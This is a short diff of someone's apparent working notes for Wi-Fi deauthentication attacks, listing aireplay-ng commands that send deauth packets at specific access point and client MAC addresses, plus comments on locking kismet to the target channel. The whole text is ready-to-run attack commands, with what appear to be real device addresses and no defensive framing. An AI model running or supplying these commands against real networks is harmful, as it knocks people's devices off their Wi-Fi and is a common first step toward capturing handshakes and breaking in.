@@ -1,6 +1,7 @@
 sudo airepay-ng -0 1 -a <BSSID> -c <CLIENT> interface
 sudo aireplay-ng -0 1 -a 48:22:54:D5:ED:4E -c 58:CB:52:13:F8:6A wlan1mon 
-sudo aireplay-ng -0 1 -a 14:EB:B6:13:8E:0D -c AC:37:43:48:F8:FB wlx00c0cab46234 
+sudo aireplay-ng -0 1 -a 50:D4:F7:6C:88:2F -c 58:CB:52:13:F8:6A wlx00c0cab46234 
+08:C5:E1:46:B3:07
 #sending one set of De-Auth packets, (64)
 #set kismet to the directed channel the access point is on. If not ocked to channel you wont find the SSID
 #best RSSI for the device
